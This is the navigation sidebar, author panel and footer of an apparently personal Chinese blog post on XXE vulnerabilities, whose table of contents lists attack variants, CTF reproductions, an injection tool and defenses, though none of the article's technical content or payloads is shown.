href="#4-%E7%8E%A9%E6%B3%952%E2%80%94%E2%80%94%E5%86%85%E7%BD%91%E6%8E%A2%E9%92%88%E6%88%96%E8%80%85%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%EF%BC%88%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E%E5%9C%B0%E5%9D%80%EF%BC%89"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.玩法2——内网探针或者攻击内网应用（触发漏洞地址）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E7%8E%A9%E6%B3%953%E2%80%94%E2%80%94RCE"><span class="nav-number">1.2.5.</span> <span class="nav-text">5.玩法3——RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E7%8E%A9%E6%B3%954%E2%80%94%E2%80%94%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93dtd"><span class="nav-number">1.2.6.</span> <span class="nav-text">6.玩法4——引入外部实体dtd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E7%8E%A9%E6%B3%955%E2%80%94%E2%80%94%E6%97%A0%E5%9B%9E%E6%98%BE%E2%80%94%E2%80%94%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.7.</span> <span class="nav-text">7.玩法5——无回显——读取文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E7%8E%A9%E6%B3%956%E2%80%94%E2%80%94%E5%8D%8F%E8%AE%AE%E2%80%94%E2%80%94%E8%AF%BB%E6%96%87%E4%BB%B6%EF%BC%88%E7%BB%95%E8%BF%87%EF%BC%89"><span class="nav-number">1.2.8.</span> <span class="nav-text">8.玩法6——协议——读文件（绕过）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E8%BF%87%E6%BB%A4%EF%BC%9F"><span class="nav-number">1.2.9.</span> <span class="nav-text">9.如何判断是什么过滤？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-xxe-lab%E9%9D%B6%E5%9C%BA%E7%99%BB%E9%99%86%E6%A1%86%E2%80%94%E2%80%94xml%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%A3%80%E6%B5%8B%E5%8F%91%E7%8E%B0"><span class="nav-number">1.3.</span> <span class="nav-text">三.xxe-lab靶场登陆框——xml数据传输测试——检测发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BF%9B%E5%85%A5%E9%9D%B6%E5%9C%BA"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.进入靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%BB%93%E5%90%88post%E4%BC%A0%E8%BE%93%E6%9E%84%E9%80%A0payload%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.结合post传输构造payload语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-CTF-Vulnhub-XXE-%E5%AE%89%E5%85%A8%E7%9C%9F%E9%A2%98%E5%A4%8D%E7%8E%B0-%E6%A3%80%E6%B5%8B-%E5%88%A9%E7%94%A8-%E6%8B%93%E5%B1%95-%E5%AE%9E%E6%88%98"><span class="nav-number">1.4.</span> <span class="nav-text">四.CTF-Vulnhub-XXE 安全真题复现-检测,利用,拓展,实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BF%9B%E5%85%A5%E9%9D%B6%E5%9C%BA-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.进入靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AF%B9%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84%E7%9B%B8%E4%BC%BCip%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.对同网段的相似ip进行扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94-CTF-Jarvis-OJ-Web-XXE%E5%AE%89%E5%85%A8%E7%9C%9F%E9%A2%98%E5%A4%8D%E7%8E%B0-%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E6%A0%BC%E5%BC%8F"><span class="nav-number">1.5.</span> <span class="nav-text">五.CTF-Jarvis-OJ-Web-XXE安全真题复现-数据请求格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD-xxe%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%B0%84%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7-XXEinjector-Ruby"><span class="nav-number">1.6.</span> <span class="nav-text">六.xxe安全漏洞自动化注射脚本工具-XXEinjector(Ruby)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83-xxe-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88-php-java-python-%E8%BF%87%E6%BB%A4%E5%8F%8A%E7%A6%81%E7%94%A8"><span class="nav-number">1.7.</span> <span class="nav-text">七.xxe 漏洞修复与防御方案-php,java,python-过滤及禁用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%A6%81%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.7.1.</span> <span class="nav-text">1.禁用外部实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%BF%87%E6%BB%A4%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E7%9A%84-XML-%E6%95%B0%E6%8D%AE"><span class="nav-number">1.7.2.</span> <span class="nav-text">2.过滤用户提交的 XML 数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%A3%85WAF%E4%BA%A7%E5%93%81"><span class="nav-number">1.7.3.</span> <span class="nav-text">3.装WAF产品</span></a></li></ol></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="zym" src="/images/Panda.jpg"><p class="site-author-name" itemprop="name">zym</p><div class="site-description" itemprop="description">生活日常随笔</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">39</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">17</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/zym1290190720" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zym1290190720" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a> </span><span class="links-of-author-item"><a href="https://space.bilibili.com/102399257" title="哔哩哔哩 → https:&#x2F;&#x2F;space.bilibili.com&#x2F;102399257" rel="noopener" target="_blank"><i class="fa fa-bilibili fa-fw"></i>哔哩哔哩</a> </span><span class="links-of-author-item"><a href="/1290190720@qq.com" title="E-Mail → 1290190720@qq.com"><i class="fa fa-email fa-fw"></i>E-Mail</a></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=7031295547&auto=1&height=430"></iframe></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">zym</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span class="post-meta-item-text">站点总字数：</span> <span title="站点总字数">120k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span class="post-meta-item-text">站点阅读时长 &asymp;</span> <span title="站点阅读时长">1:49</span></div><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span><script>var now=new Date;function createtime(){var n=new Date("10/20/2021 17:38:00");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("timeDate").innerHTML="本站已运行 "+dnum+" 天 ",document.getElementById("times").innerHTML=hnum+" 小时 "+mnum+" 分 "+snum+" 秒"}setInterval("createtime()",250)</script><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-divider">|</span> <span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div></div></footer></div><script color="" opacity="" zindex="" count="" src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script><script src="/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var e,t,o,n,r=document.getElementsByTagName("link");if(0<r.length)for(i=0;i<r.length;i++)"canonical"==r[i].rel.toLowerCase()&&r[i].href&&(e=r[i].href);t=(e||window.location.protocol).split(":")[0],e=e||window.location.href,window,o=e,n=document.referrer,/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi.test(o)||(t="https"===String(t).toLowerCase()?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif",n?(t+="?r="+encodeURIComponent(document.referrer),o&&(t+="&l="+o)):o&&(t+="?l="+o),(new Image).src=t)}()</script><script src="/js/local-search.js"></script><script>NexT.utils.loadComments(document.querySelector("#valine-comments"),()=>{NexT.utils.getScript("//unpkg.com/valine/dist/Valine.min.js",()=>{var i=["nick","mail","link"],e="nick,mail,link".split(",").filter(e=>i.includes(e));new Valine({el:"#valine-comments",verify:!1,notify:!1,appId:"7p2LmPjyfCosM5SP4z3ebEAM-gzGzoHsz",appKey:"eeaup3Y0KIEkbiXMdTna4Hgy",placeholder:"留下你的足迹吧",avatar:"mm",meta:e,pageSize:"10",visitor:!1,lang:"zh-cn",path:location.pathname,recordIP:!1,serverURLs:""})},window.Valine)})</script><！ - 页面点击小红心 - ><script type="text/javascript" src="/js/love-click.js"></script></body></html>